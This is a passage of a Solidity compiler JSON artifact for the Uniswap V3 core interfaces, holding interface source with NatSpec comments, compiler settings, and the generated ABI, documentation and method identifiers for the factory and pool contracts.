token1 for token0\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\n    /// @param recipient The address to receive the output of the swap\n    /// @param zeroForOne The direction of the swap, true for token0 to token1, false for token1 to token0\n    /// @param amountSpecified The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\n    /// @param sqrtPriceLimitX96 The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this\n    /// value after the swap. If one for zero, the price cannot be greater than this value after the swap\n    /// @param data Any data to be passed through to the callback\n    /// @return amount0 The delta of the balance of token0 of the pool, exact when negative, minimum when positive\n    /// @return amount1 The delta of the balance of token1 of the pool, exact when negative, minimum when positive\n    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external returns (int256 amount0, int256 amount1);\n\n    /// @notice Receive token0 and/or token1 and pay it back, plus a fee, in the callback\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallback\n    /// @dev Can be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling\n    /// with 0 amount{0,1} and sending the donation amount(s) from the callback\n    /// @param recipient The address which will receive the token0 and token1 amounts\n    /// @param amount0 The amount of token0 to send\n    /// @param amount1 The amount of token1 to send\n    /// @param data Any data to be passed through to the callback\n    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n\n    /// @notice Increase the maximum number of price and liquidity observations that this pool will store\n    /// @dev This method is no-op if the pool already has an observationCardinalityNext greater than or equal to\n    /// the input observationCardinalityNext.\n    /// @param observationCardinalityNext The desired minimum number of observations for the pool to store\n    function increaseObservationCardinalityNext(uint16 observationCardinalityNext) external;\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Pool state that is not stored\n/// @notice Contains view functions to provide information about the pool that is computed rather than stored on the\n/// blockchain. The functions here may have variable gas costs.\ninterface IUniswapV3PoolDerivedState {\n    /// @notice Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\n    /// @dev To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing\n    /// the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick,\n    /// you must call it with secondsAgos = [3600, 0].\n    /// @dev The time weighted average tick represents the geometric time weighted average price of the pool, in\n    /// log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\n    /// @param secondsAgos From how long ago each cumulative tick and liquidity value should be returned\n    /// @return tickCumulatives Cumulative tick values as of each `secondsAgos` from the current block timestamp\n    /// @return secondsPerLiquidityCumulativeX128s Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block\n    /// timestamp\n    function observe(uint32[] calldata secondsAgos)\n        external\n        view\n        returns (int56[] memory tickCumulatives, uint160[] memory secondsPerLiquidityCumulativeX128s);\n\n    /// @notice Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\n    /// @dev Snapshots must only be compared to other snapshots, taken over a period for which a position existed.\n    /// I.e., snapshots cannot be compared if a position is not held for the entire period between when the first\n    /// snapshot is taken and the second snapshot is taken.\n    /// @param tickLower The lower tick of the range\n    /// @param tickUpper The upper tick of the range\n    /// @return tickCumulativeInside The snapshot of the tick accumulator for the range\n    /// @return secondsPerLiquidityInsideX128 The snapshot of seconds per liquidity for the range\n    /// @return secondsInside The snapshot of seconds per liquidity for the range\n    function snapshotCumulativesInside(int24 tickLower, int24 tickUpper)\n        external\n        view\n        returns (\n            int56 tickCumulativeInside,\n            uint160 secondsPerLiquidityInsideX128,\n            uint32 secondsInside\n        );\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Pool state that can change\n/// @notice These methods compose the pool's state, and can change with any frequency including multiple times\n/// per transaction\ninterface IUniswapV3PoolState {\n    /// @notice The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas\n    /// when accessed externally.\n    /// @return sqrtPriceX96 The current price of the pool as a sqrt(token1/token0) Q64.96 value\n    /// tick The current tick of the pool, i.e. according to the last tick transition that was run.\n    /// This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick\n    /// boundary.\n    /// observationIndex The index of the last oracle observation that was written,\n    /// observationCardinality The current maximum number of observations stored in the pool,\n    /// observationCardinalityNext The next maximum number of observations, to be updated when the observation.\n    /// feeProtocol The protocol fee for both tokens of the pool.\n    /// Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0\n    /// is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee.\n    /// unlocked Whether the pool is currently locked to reentrancy\n    function slot0()\n        external\n        view\n        returns (\n            uint160 sqrtPriceX96,\n            int24 tick,\n            uint16 observationIndex,\n            uint16 observationCardinality,\n            uint16 observationCardinalityNext,\n            uint8 feeProtocol,\n            bool unlocked\n        );\n\n    /// @notice The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\n    /// @dev This value can overflow the uint256\n    function feeGrowthGlobal0X128() external view returns (uint256);\n\n    /// @notice The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\n    /// @dev This value can overflow the uint256\n    function feeGrowthGlobal1X128() external view returns (uint256);\n\n    /// @notice The amounts of token0 and token1 that are owed to the protocol\n    /// @dev Protocol fees will never exceed uint128 max in either token\n    function protocolFees() external view returns (uint128 token0, uint128 token1);\n\n    /// @notice The currently in range liquidity available to the pool\n    /// @dev This value has no relationship to the total liquidity across all ticks\n    function liquidity() external view returns (uint128);\n\n    /// @notice Look up information about a specific tick in the pool\n    /// @param tick The tick to look up\n    /// @return liquidityGross the total amount of position liquidity that uses the pool either as tick lower or\n    /// tick upper,\n    /// liquidityNet how much liquidity changes when the pool price crosses the tick,\n    /// feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0,\n    /// feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1,\n    /// tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick\n    /// secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick,\n    /// secondsOutside the seconds spent on the other side of the tick from the current tick,\n    /// initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false.\n    /// Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0.\n    /// In addition, these values are only relative and must be used only in comparison to previous snapshots for\n    /// a specific position.\n    function ticks(int24 tick)\n        external\n        view\n        returns (\n            uint128 liquidityGross,\n            int128 liquidityNet,\n            uint256 feeGrowthOutside0X128,\n            uint256 feeGrowthOutside1X128,\n            int56 tickCumulativeOutside,\n            uint160 secondsPerLiquidityOutsideX128,\n            uint32 secondsOutside,\n            bool initialized\n        );\n\n    /// @notice Returns 256 packed tick initialized boolean values. See TickBitmap for more information\n    function tickBitmap(int16 wordPosition) external view returns (uint256);\n\n    /// @notice Returns the information about a position by the position's key\n    /// @param key The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\n    /// @return _liquidity The amount of liquidity in the position,\n    /// Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke,\n    /// Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke,\n    /// Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke,\n    /// Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke\n    function positions(bytes32 key)\n        external\n        view\n        returns (\n            uint128 _liquidity,\n            uint256 feeGrowthInside0LastX128,\n            uint256 feeGrowthInside1LastX128,\n            uint128 tokensOwed0,\n            uint128 tokensOwed1\n        );\n\n    /// @notice Returns data about a specific observation index\n    /// @param index The element of the observations array to fetch\n    /// @dev You most likely want to use #observe() instead of this method to get an observation as of some amount of time\n    /// ago, rather than at a specific index in the array.\n    /// @return blockTimestamp The timestamp of the observation,\n    /// Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp,\n    /// Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp,\n    /// Returns initialized whether the observation has been initialized and the values are safe to use\n    function observations(uint256 index)\n        external\n        view\n        returns (\n            uint32 blockTimestamp,\n            int56 tickCumulative,\n            uint160 secondsPerLiquidityCumulativeX128,\n            bool initialized\n        );\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Pool state that never changes\n/// @notice These parameters are fixed for a pool forever, i.e., the methods will always return the same values\ninterface IUniswapV3PoolImmutables {\n    /// @notice The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\n    /// @return The contract address\n    function factory() external view returns (address);\n\n    /// @notice The first of the two tokens of the pool, sorted by address\n    /// @return The token contract address\n    function token0() external view returns (address);\n\n    /// @notice The second of the two tokens of the pool, sorted by address\n    /// @return The token contract address\n    function token1() external view returns (address);\n\n    /// @notice The pool's fee in hundredths of a bip, i.e. 1e-6\n    /// @return The fee\n    function fee() external view returns (uint24);\n\n    /// @notice The pool tick spacing\n    /// @dev Ticks can only be used at multiples of this value, minimum of 1 and always positive\n    /// e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ...\n    /// This value is an int24 to avoid casting even though it is always positive.\n    /// @return The tick spacing\n    function tickSpacing() external view returns (int24);\n\n    /// @notice The maximum amount of position liquidity that can use any tick in the range\n    /// @dev This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and\n    /// also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\n    /// @return The max amount of liquidity per tick\n    function maxLiquidityPerTick() external view returns (uint128);\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol": {
				"IUniswapV3Factory": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickSpacing",
									"type": "int24"
								}
							],
							"name": "FeeAmountEnabled",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "oldOwner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "newOwner",
									"type": "address"
								}
							],
							"name": "OwnerChanged",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "token0",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "token1",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tickSpacing",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "pool",
									"type": "address"
								}
							],
							"name": "PoolCreated",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "tokenA",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "tokenB",
									"type": "address"
								},
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								}
							],
							"name": "createPool",
							"outputs": [
								{
									"internalType": "address",
									"name": "pool",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								},
								{
									"internalType": "int24",
									"name": "tickSpacing",
									"type": "int24"
								}
							],
							"name": "enableFeeAmount",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								}
							],
							"name": "feeAmountTickSpacing",
							"outputs": [
								{
									"internalType": "int24",
									"name": "",
									"type": "int24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "tokenA",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "tokenB",
									"type": "address"
								},
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								}
							],
							"name": "getPool",
							"outputs": [
								{
									"internalType": "address",
									"name": "pool",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_owner",
									"type": "address"
								}
							],
							"name": "setOwner",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"events": {
							"FeeAmountEnabled(uint24,int24)": {
								"params": {
									"fee": "The enabled fee, denominated in hundredths of a bip",
									"tickSpacing": "The minimum number of ticks between initialized ticks for pools created with the given fee"
								}
							},
							"OwnerChanged(address,address)": {
								"params": {
									"newOwner": "The owner after the owner was changed",
									"oldOwner": "The owner before the owner was changed"
								}
							},
							"PoolCreated(address,address,uint24,int24,address)": {
								"params": {
									"fee": "The fee collected upon every swap in the pool, denominated in hundredths of a bip",
									"pool": "The address of the created pool",
									"tickSpacing": "The minimum number of ticks between initialized ticks",
									"token0": "The first token of the pool by address sort order",
									"token1": "The second token of the pool by address sort order"
								}
							}
						},
						"kind": "dev",
						"methods": {
							"createPool(address,address,uint24)": {
								"details": "tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments are invalid.",
								"params": {
									"fee": "The desired fee for the pool",
									"tokenA": "One of the two tokens in the desired pool",
									"tokenB": "The other of the two tokens in the desired pool"
								},
								"returns": {
									"pool": "The address of the newly created pool"
								}
							},
							"enableFeeAmount(uint24,int24)": {
								"details": "Fee amounts may never be removed once enabled",
								"params": {
									"fee": "The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)",
									"tickSpacing": "The spacing between ticks to be enforced for all pools created with the given fee amount"
								}
							},
							"feeAmountTickSpacing(uint24)": {
								"details": "A fee amount can never be removed, so this value should be hard coded or cached in the calling context",
								"params": {
									"fee": "The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee"
								},
								"returns": {
									"_0": "The tick spacing"
								}
							},
							"getPool(address,address,uint24)": {
								"details": "tokenA and tokenB may be passed in either token0/token1 or token1/token0 order",
								"params": {
									"fee": "The fee collected upon every swap in the pool, denominated in hundredths of a bip",
									"tokenA": "The contract address of either token0 or token1",
									"tokenB": "The contract address of the other token"
								},
								"returns": {
									"pool": "The pool address"
								}
							},
							"owner()": {
								"details": "Can be changed by the current owner via setOwner",
								"returns": {
									"_0": "The address of the factory owner"
								}
							},
							"setOwner(address)": {
								"details": "Must be called by the current owner",
								"params": {
									"_owner": "The new owner of the factory"
								}
							}
						},
						"title": "The interface for the Uniswap V3 Factory",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"createPool(address,address,uint24)": "a1671295",
							"enableFeeAmount(uint24,int24)": "8a7c195f",
							"feeAmountTickSpacing(uint24)": "22afcccb",
							"getPool(address,address,uint24)": "1698ee82",
							"owner()": "8da5cb5b",
							"setOwner(address)": "13af4035"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickSpacing\",\"type\":\"int24\"}],\"name\":\"FeeAmountEnabled\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnerChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"token0\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"token1\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tickSpacing\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"pool\",\"type\":\"address\"}],\"name\":\"PoolCreated\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"},{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"}],\"name\":\"createPool\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pool\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"},{\"internalType\":\"int24\",\"name\":\"tickSpacing\",\"type\":\"int24\"}],\"name\":\"enableFeeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"}],\"name\":\"feeAmountTickSpacing\",\"outputs\":[{\"internalType\":\"int24\",\"name\":\"\",\"type\":\"int24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"},{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"}],\"name\":\"getPool\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pool\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"setOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"events\":{\"FeeAmountEnabled(uint24,int24)\":{\"params\":{\"fee\":\"The enabled fee, denominated in hundredths of a bip\",\"tickSpacing\":\"The minimum number of ticks between initialized ticks for pools created with the given fee\"}},\"OwnerChanged(address,address)\":{\"params\":{\"newOwner\":\"The owner after the owner was changed\",\"oldOwner\":\"The owner before the owner was changed\"}},\"PoolCreated(address,address,uint24,int24,address)\":{\"params\":{\"fee\":\"The fee collected upon every swap in the pool, denominated in hundredths of a bip\",\"pool\":\"The address of the created pool\",\"tickSpacing\":\"The minimum number of ticks between initialized ticks\",\"token0\":\"The first token of the pool by address sort order\",\"token1\":\"The second token of the pool by address sort order\"}}},\"kind\":\"dev\",\"methods\":{\"createPool(address,address,uint24)\":{\"details\":\"tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments are invalid.\",\"params\":{\"fee\":\"The desired fee for the pool\",\"tokenA\":\"One of the two tokens in the desired pool\",\"tokenB\":\"The other of the two tokens in the desired pool\"},\"returns\":{\"pool\":\"The address of the newly created pool\"}},\"enableFeeAmount(uint24,int24)\":{\"details\":\"Fee amounts may never be removed once enabled\",\"params\":{\"fee\":\"The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)\",\"tickSpacing\":\"The spacing between ticks to be enforced for all pools created with the given fee amount\"}},\"feeAmountTickSpacing(uint24)\":{\"details\":\"A fee amount can never be removed, so this value should be hard coded or cached in the calling context\",\"params\":{\"fee\":\"The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee\"},\"returns\":{\"_0\":\"The tick spacing\"}},\"getPool(address,address,uint24)\":{\"details\":\"tokenA and tokenB may be passed in either token0/token1 or token1/token0 order\",\"params\":{\"fee\":\"The fee collected upon every swap in the pool, denominated in hundredths of a bip\",\"tokenA\":\"The contract address of either token0 or token1\",\"tokenB\":\"The contract address of the other token\"},\"returns\":{\"pool\":\"The pool address\"}},\"owner()\":{\"details\":\"Can be changed by the current owner via setOwner\",\"returns\":{\"_0\":\"The address of the factory owner\"}},\"setOwner(address)\":{\"details\":\"Must be called by the current owner\",\"params\":{\"_owner\":\"The new owner of the factory\"}}},\"title\":\"The interface for the Uniswap V3 Factory\",\"version\":1},\"userdoc\":{\"events\":{\"FeeAmountEnabled(uint24,int24)\":{\"notice\":\"Emitted when a new fee amount is enabled for pool creation via the factory\"},\"OwnerChanged(address,address)\":{\"notice\":\"Emitted when the owner of the factory is changed\"},\"PoolCreated(address,address,uint24,int24,address)\":{\"notice\":\"Emitted when a pool is created\"}},\"kind\":\"user\",\"methods\":{\"createPool(address,address,uint24)\":{\"notice\":\"Creates a pool for the given two tokens and fee\"},\"enableFeeAmount(uint24,int24)\":{\"notice\":\"Enables a fee amount with the given tickSpacing\"},\"feeAmountTickSpacing(uint24)\":{\"notice\":\"Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled\"},\"getPool(address,address,uint24)\":{\"notice\":\"Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist\"},\"owner()\":{\"notice\":\"Returns the current owner of the factory\"},\"setOwner(address)\":{\"notice\":\"Updates the owner of the factory\"}},\"notice\":\"The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\":\"IUniswapV3Factory\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\":{\"keccak256\":\"0xcc3d0c93fc9ac0febbe09f941b465b57f750bcf3b48432da0b97dc289cfdc489\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://b9379ad954680c44a0bc523b314ae4c4da735f9fe1d02aa56ea5bdba6f1136f2\",\"dweb:/ipfs/QmZXdgQNXKAckrXWz9R3mc47F1fvDvr28a2ewJrwNAw71B\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"events": {
							"FeeAmountEnabled(uint24,int24)": {
								"notice": "Emitted when a new fee amount is enabled for pool creation via the factory"
							},
							"OwnerChanged(address,address)": {
								"notice": "Emitted when the owner of the factory is changed"
							},
							"PoolCreated(address,address,uint24,int24,address)": {
								"notice": "Emitted when a pool is created"
							}
						},
						"kind": "user",
						"methods": {
							"createPool(address,address,uint24)": {
								"notice": "Creates a pool for the given two tokens and fee"
							},
							"enableFeeAmount(uint24,int24)": {
								"notice": "Enables a fee amount with the given tickSpacing"
							},
							"feeAmountTickSpacing(uint24)": {
								"notice": "Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled"
							},
							"getPool(address,address,uint24)": {
								"notice": "Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist"
							},
							"owner()": {
								"notice": "Returns the current owner of the factory"
							},
							"setOwner(address)": {
								"notice": "Updates the owner of the factory"
							}
						},
						"notice": "The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees",
						"version": 1
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol": {
				"IUniswapV3Pool": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Burn",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "Collect",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "CollectProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid1",
									"type": "uint256"
								}
							],
							"name": "Flash",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextOld",
									"type": "uint16"
								},
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextNew",
									"type": "uint16"
								}
							],
							"name": "IncreaseObservationCardinalityNext",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Initialize",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Mint",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0New",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1New",
									"type": "uint8"
								}
							],
							"name": "SetFeeProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "int256",
									"name": "amount0",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "liquidity",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Swap",
